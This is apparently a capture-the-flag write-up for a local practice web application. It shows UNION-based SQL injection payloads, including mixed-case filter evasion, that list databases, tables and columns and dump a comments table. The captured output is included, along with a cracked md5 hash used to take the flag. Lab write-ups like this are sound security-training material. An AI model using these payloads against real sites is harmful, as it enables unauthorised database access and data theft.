# SQL Injection

```
1 UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

Surname : |information_schema|,|Member_Brute_Force|,|Member_Sql_Injection|,|Member_guestbook|,|Member_images|,|Member_survey|
```

```
1 UNION ALL SELECT table_name,2 from information_schema.tables

ID: 1 UNION ALL SELECT table_name,2 from information_schema.tables
First name: db_default
Surname : 2

ID: 1 UNION ALL SELECT table_name,2 from information_schema.tables
First name: users
Surname : 2

ID: 1 UNION ALL SELECT table_name,2 from information_schema.tables
First name: guestbook
Surname : 2

ID: 1 UNION ALL SELECT table_name,2 from information_schema.tables
First name: list_images
Surname : 2

ID: 1 UNION ALL SELECT table_name,2 from information_schema.tables
First name: vote_dbs
Surname : 2
```

list Columns : 
`http://192.168.56.102/\?page\=searchimg\&id\=1+UNION+ALL+SELECT+column_name%2Ctable_name+from+information_schema.columns\&Submit\=Submit\#`

display comment : 
`http://192.168.56.102/?page=searchimg&id=1+UNION+SELECT+concat%28id%2Cchar%2858%29%2Curl%2Cchar%2858%29%2Ctitle%2Cchar%2858%29%2Ccomment%2Cchar%2858%29%29%2C2+FROM+list_images&Submit=Submit#`

If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46: -> albatroz
